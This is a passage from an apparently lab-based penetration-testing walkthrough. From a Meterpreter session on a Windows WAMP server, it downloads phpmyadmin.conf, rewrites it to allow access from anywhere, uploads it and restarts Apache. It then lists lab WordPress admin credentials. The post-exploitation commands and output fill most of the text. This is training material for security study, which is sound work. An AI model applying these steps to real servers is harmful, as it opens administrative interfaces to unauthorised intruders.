100666/rw-rw-rw-  182407   fil   2021-10-28 20:00:09 +0530  unins000.dat
100777/rwxrwxrwx  913246   fil   2021-10-28 20:00:04 +0530  unins000.exe
100777/rwxrwxrwx  209      fil   2021-10-28 20:00:09 +0530  uninstall_services.bat
100666/rw-rw-rw-  994      fil   2021-10-28 20:00:09 +0530  wampmanager.conf
100777/rwxrwxrwx  1169920  fil   2010-12-31 21:10:06 +0530  wampmanager.exe
100666/rw-rw-rw-  1147     fil   2021-10-28 20:00:09 +0530  wampmanager.ini
100666/rw-rw-rw-  12681    fil   2021-10-28 20:00:09 +0530  wampmanager.tpl
040777/rwxrwxrwx  4096     dir   2021-10-28 20:07:30 +0530  www

meterpreter > cd alias\\
meterpreter > ls
Listing: C:\wamp\alias
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1488  fil   2021-10-28 19:48:52 +0530  httpd-dav.conf
100666/rw-rw-rw-  471   fil   2021-10-28 19:48:58 +0530  phpmyadmin.conf
100666/rw-rw-rw-  441   fil   2021-10-28 20:00:09 +0530  sqlbuddy.conf
100666/rw-rw-rw-  439   fil   2021-10-28 20:00:09 +0530  webgrind.conf
```

```
meterpreter > cat phpmyadmin.conf 
Alias /phpmyadmin "c:/wamp/apps/phpmyadmin3.4.10.1/" 

# to give access to phpmyadmin from outside 
# replace the lines
#
#        Order Deny,Allow
#       Deny from all
#       Allow from 127.0.0.1
#
# by
#
#        Order Allow,Deny 
#   Allow from all
#

<Directory "c:/wamp/apps/phpmyadmin3.4.10.1/">
    Options Indexes FollowSymLinks MultiViews
    AllowOverride all
        Order Deny,Allow
        Deny from all
        Allow from 127.0.0.1
</Directory>
```

```
meterpreter > download phpmyadmin.conf
[*] Downloading: phpmyadmin.conf -> /root/phpmyadmin.conf
[*] Downloaded 471.00 B of 471.00 B (100.0%): phpmyadmin.conf -> /root/phpmyadmin.conf
[*] download   : phpmyadmin.conf -> /root/phpmyadmin.conf
```

```
root@attackdefense:~# ls
Desktop  phpmyadmin.conf  thinclient_drives
root@attackdefense:~# vim phpmyadmin.conf
root@attackdefense:~# cat phpmyadmin.conf 
Alias /phpmyadmin "c:/wamp/apps/phpmyadmin3.4.10.1/" 

# to give access to phpmyadmin from outside 
# replace the lines
#
#        Order Deny,Allow
#       Deny from all
#       Allow from 127.0.0.1
#
# by
#
#        Order Allow,Deny 
#   Allow from all
#

<Directory "c:/wamp/apps/phpmyadmin3.4.10.1/">
    Options Indexes FollowSymLinks MultiViews
    AllowOverride all
        Allow from all 
</Directory>
```

```
meterpreter > upload phpmyadmin.conf
[*] uploading  : /root/phpmyadmin.conf -> phpmyadmin.conf
[*] Uploaded 417.00 B of 417.00 B (100.0%): /root/phpmyadmin.conf -> phpmyadmin.conf
[*] uploaded   : /root/phpmyadmin.conf -> phpmyadmin.conf
meterpreter > ls
Listing: C:\wamp\alias
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1488  fil   2021-10-28 19:48:52 +0530  httpd-dav.conf
100666/rw-rw-rw-  417   fil   2023-05-06 19:17:15 +0530  phpmyadmin.conf
100666/rw-rw-rw-  441   fil   2021-10-28 20:00:09 +0530  sqlbuddy.conf
100666/rw-rw-rw-  439   fil   2021-10-28 20:00:09 +0530  webgrind.conf

meterpreter > cat phpmyadmin.conf 
Alias /phpmyadmin "c:/wamp/apps/phpmyadmin3.4.10.1/" 

# to give access to phpmyadmin from outside 
# replace the lines
#
#        Order Deny,Allow
#       Deny from all
#       Allow from 127.0.0.1
#
# by
#
#        Order Allow,Deny 
#   Allow from all
#

<Directory "c:/wamp/apps/phpmyadmin3.4.10.1/">
    Options Indexes FollowSymLinks MultiViews
    AllowOverride all
        Allow from all 
</Directory>
```

```
meterpreter > shell
Process 1280 created.
Channel 6 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp\alias>net stop wampapache
net stop wampapache
The wampapache service is stopping.
The wampapache service was stopped successfully.


C:\wamp\alias>net start wampapache
net start wampapache
The wampapache service is starting.
The wampapache service was started successfully.
```

![QQ图片20230506215406.png](/img/in-post/ine/QQ图片20230506215406.png)

![QQ图片20230506215626.png](/img/in-post/ine/QQ图片20230506215626.png)

![QQ图片20230506215834.png](/img/in-post/ine/QQ图片20230506215834.png)

![QQ图片20230506220030.png](/img/in-post/ine/QQ图片20230506220030.png)

10.0.19.60    demo.ine.local

Kali Linux: 10.10.16.3

The target is crashed. The step remain is log in to wordpress using the following credentials:

```
http://10.0.25.212:8585/wordpress/wp-admin
```

```
admin
password123
```

![QQ图片20230506232433.png](/img/in-post/ine/QQ图片20230506232433.png)

![QQ图片20230506232623.png](/img/in-post/ine/QQ图片20230506232623.png)